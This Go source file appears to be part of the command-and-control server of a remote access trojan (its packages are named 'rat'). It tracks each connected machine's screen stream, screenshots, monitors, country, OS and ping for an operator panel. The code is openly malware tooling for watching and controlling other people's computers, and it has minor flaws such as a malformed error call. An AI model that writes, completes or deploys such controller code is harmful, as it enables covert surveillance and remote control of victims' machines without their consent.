package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"rat/command/log"
	"rat/shared"
	"rat/shared/network/header"

	"strconv"
	"strings"
	"time"

	"github.com/xtaci/smux"
	"golang.org/x/net/websocket"
)

type listenerMap map[header.PacketHeader]*websocket.Conn

type Client struct {
	session *smux.Session
	Conn    net.Conn
	stream  *smux.Stream

	Id int

	shared.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start    time.Time
		Current  int
		Received bool
	}

	Screen struct {
		Streaming bool
		New       bool
		Buffer    []byte
	}

	Queue      chan Outgoing
	streamChan chan Channel
	die        chan struct{}

	Listeners listenerMap

	Monitors []shared.Monitor

	Authenticated bool
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan Outgoing)
	client.streamChan = make(chan Channel)
	client.die = make(chan struct{})

	client.Conn = conn
	client.Id = int(rand.Int31())
	client.Computer = shared.Computer{}
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Listeners = make(map[header.PacketHeader]*websocket.Conn)
	client.Monitors = make([]shared.Monitor, 0)

	return client
}

func (c *Client) recvLoop() {
	var err error
	for {
		var h header.PacketHeader
		err = binary.Read(c.stream, shared.ByteOrder, &h)

		if err != nil {
			break
		}

		packet, is := incomingPackets[h]
		if !is {
			err = fmt.Errorf("missing packet", h)
			break
		}

		packet.Read(c.stream, c)
	}

	log.Println("remove", err.Error())
	removeClient(c)
}

func (c *Client) writeLoop() {
	for {
		select {
		case ch := <-c.streamChan:
			stream, _ := c.session.OpenStream()
			c.WriteHeader(ch.Header(), true)
			go ch.Open(stream, c)
		case p := <-c.Queue:
			c.WriteHeader(p.Header(), false)
			p.Write(c.stream, c)
		case <-c.die:
			return
		}
	}
}

func (c Client) Close() error {
	close(c.Queue)
	close(c.streamChan)
	c.stream.Close()
	return c.Conn.Close()
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

// GetFlagName returns the flag filename without extension for the client
// If connection is inside a local network, use "local" icon
// If a country is not found for this clients IP address, return a "unknown" icon
func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

// GetCountry returns the full country name for the client
func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

// GetPing returns the current ping in milliseconds followed by " ms"
func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (c *Client) GetPathSep() string {
	if c.Computer.OperatingSystemType == shared.Windows {
		return "\\"
	}

	return "/"
}

// Heartbeat pings the client and waits
func (c *Client) Heartbeat() {
	for {
		c.Queue <- &Ping{}

		for !c.Ping.Received {
			time.Sleep(time.Millisecond)
		}

		time.Sleep(time.Second * 2)
	}
}

func (c *Client) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c.stream, shared.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header header.PacketHeader, channel bool) error {
	err := binary.Write(c.stream, shared.ByteOrder, header)

	if err != nil {
		return err
	}

	return binary.Write(c.stream, shared.ByteOrder, channel)
}

// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
func (c *Client) GetEncodedScreen() string {
	return base64.StdEncoding.EncodeToString(c.Screen.Buffer)
}

func (c *Client) GetClientData() ClientData {
	return ClientData{
		Ping:     c.Ping.Current,
		Country:  c.GetCountry(),
		Flag:     c.GetFlagName(),
		Host:     c.GetDisplayHost(),
		Hostname: c.Computer.GetDisplayName(),
		Username: "ss",
		Monitors: c.Monitors,
		OperatingSystem: OperatingSystem{
			Type:    c.OperatingSystemType,
			Display: c.Computer.OperatingSystem,
		},
	}
}
